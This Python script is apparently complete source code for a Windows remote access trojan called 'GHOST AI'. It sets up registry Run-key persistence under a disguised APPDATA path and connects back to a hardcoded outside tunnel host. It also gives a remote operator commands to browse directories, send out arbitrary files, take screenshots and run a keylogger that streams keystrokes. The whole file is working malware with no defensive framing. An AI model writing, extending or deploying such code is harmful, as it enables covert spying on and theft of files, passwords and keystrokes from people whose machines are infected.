import os
import time
import socket
import webbrowser
import urllib.parse
import psutil
import pyautogui
import threading
import ctypes
import platform
import subprocess
from pynput import keyboard
import sys
import shutil
import winreg

REVERSE_SERVER_IP = "homes-problem.gl.at.ply.gg"
REVERSE_SERVER_PORT = 32468

current_dir = os.path.expanduser("~")
keylogger_running = False
keylog_thread = None

def setup_persistence():
    exe_path = sys.executable
    dest_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows")
    dest_path = os.path.join(dest_folder, "ghost_ai.exe")

    if not os.path.exists(dest_folder):
        os.makedirs(dest_folder)

    if not os.path.exists(dest_path):
        try:
            shutil.copy(exe_path, dest_path)
        except:
            pass

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "GhostAI", 0, winreg.REG_SZ, dest_path)
        winreg.CloseKey(key)
    except:
        pass

def send_response(sock, message):
    try:
        sock.sendall(message.encode() + b"\n")
    except:
        pass

def send_file(sock, filepath):
    if not os.path.isfile(filepath):
        send_response(sock, f"File not found: {filepath}")
        return
    try:
        with open(filepath, "rb") as f:
            sock.send(b"FILE_TRANSFER_BEGIN\n")
            sock.send(filepath.encode() + b"\n")
            while chunk := f.read(4096):
                sock.send(chunk)
            sock.send(b"\nFILE_TRANSFER_END\n")
    except Exception as e:
        send_response(sock, f"Failed to send file: {e}")

def capture_screenshot(sock):
    try:
        image = pyautogui.screenshot()
        path = os.path.join(os.getenv("TEMP"), "screen.png")
        image.save(path)
        send_file(sock, path)
        os.remove(path)
    except:
        send_response(sock, "Screenshot failed")

def get_battery(sock):
    try:
        battery = psutil.sensors_battery()
        percent = battery.percent if battery else "N/A"
        send_response(sock, f"Battery: {percent}%")
    except:
        send_response(sock, "Battery status not available.")

def set_volume(mute=True):
    try:
        if platform.system() == "Windows":
            ctypes.windll.user32.SendMessageW(0xFFFF, 0x319, 0x3019, 0x80000 if mute else 0x80001)
    except:
        pass

def start_keylogger(sock):
    def on_press(key):
        try:
            sock.sendall(f"{key.char}".encode())
        except AttributeError:
            sock.sendall(f"[{key}]".encode())
        except:
            pass

    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    return listener

def process_command(sock, command):
    global current_dir, keylogger_running, keylog_thread
    command = command.strip()

    if not command:
        return

    if command == "help":
        help_text = """
📖 GHOST AI Command List:

📂 File & Folder:
- dir                    → List current directory contents
- cd foldername         → Change directory into a folder
- cd ..                 → Go back one directory
- send [file path]      → Send file to server
- screenshot            → Take and send screenshot

🌐 Web:
- [domain.com]          → Open website (e.g., google.com)
- [https://url.com]     → Open full URL

⚙️ System:
- open notepad/chrome   → Open apps
- mute / unmute         → Mute or unmute system volume
- send battery          → Battery percentage

⌨️ Keystroke Logging:
- keylogger start       → Start keylogger
- keylogger stop        → Stop keylogger

🆘 Show this list again:
- help
"""
        send_response(sock, help_text)
        return

    if command.startswith("open "):
        app = command[5:].strip().lower()
        app_paths = {
            "notepad": "notepad.exe",
            "chrome": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            "edge": r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
            "calculator": "calc.exe",
            "paint": "mspaint.exe",
            "cmd": "cmd.exe"
        }
        if app in app_paths:
            try:
                os.startfile(app_paths[app])
                send_response(sock, f"Opened application: {app}")
            except Exception as e:
                send_response(sock, f"Failed to open {app}: {e}")
        else:
            send_response(sock, f"Unknown app: {app}")
        return

    if command == "screenshot":
        capture_screenshot(sock)
        return

    if command.startswith("send "):
        filepath = command[5:].strip().strip('"')
        if not os.path.isabs(filepath):
            filepath = os.path.join(current_dir, filepath)
        send_file(sock, filepath)
        return

    if command == "send battery":
        get_battery(sock)
        return

    if command == "mute":
        set_volume(True)
        send_response(sock, "Muted")
        return

    if command == "unmute":
        set_volume(False)
        send_response(sock, "Unmuted")
        return

    if command == "keylogger start":
        if not keylogger_running:
            keylog_thread = start_keylogger(sock)
            keylogger_running = True
            send_response(sock, "Keylogger started")
        else:
            send_response(sock, "Keylogger already running")
        return

    if command == "keylogger stop":
        if keylogger_running and keylog_thread:
            keylog_thread.stop()
            keylogger_running = False
            send_response(sock, "Keylogger stopped")
        else:
            send_response(sock, "Keylogger not running")
        return

    if command == "dir":
        try:
            items = os.listdir(current_dir)
            response = "\n".join(items) if items else "Directory is empty."
            send_response(sock, f"{current_dir}:\n{response}")
        except Exception as e:
            send_response(sock, f"Error: {e}")
        return

    if command.startswith("cd"):
        parts = command.split(maxsplit=1)
        if len(parts) == 1 or parts[1] == "..":
            new_dir = os.path.dirname(current_dir)
        else:
            target = parts[1]
            new_dir = os.path.abspath(os.path.join(current_dir, target))

        if os.path.isdir(new_dir):
            current_dir = os.path.normpath(new_dir)
            send_response(sock, f"Changed to: {current_dir}")
        else:
            send_response(sock, f"Not found: {new_dir}")
        return

    full_path = command
    if not os.path.isabs(full_path):
        full_path = os.path.join(current_dir, command)

    if os.path.isfile(full_path):
        try:
            os.startfile(full_path)
            send_response(sock, f"Opened file: {full_path}")
        except Exception as e:
            send_response(sock, f"Failed to open file: {e}")
        return

    if '.' in command and ' ' not in command:
        url = command
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        try:
            webbrowser.open(url)
            send_response(sock, f"Opened URL: {url}")
        except:
            send_response(sock, "Failed to open URL")
        return

    # No Wikipedia fallback anymore
    send_response(sock, "Unknown command. Type 'help' for options.")

def reverse_tcp_client():
    setup_persistence()
    while True:
        try:
            with socket.socket() as s:
                s.connect((REVERSE_SERVER_IP, REVERSE_SERVER_PORT))
                while True:
                    data = s.recv(1024).decode('utf-8').strip()
                    if not data:
                        break
                    process_command(s, data)
        except:
            time.sleep(5)

if __name__ == "__main__":
    reverse_tcp_client()
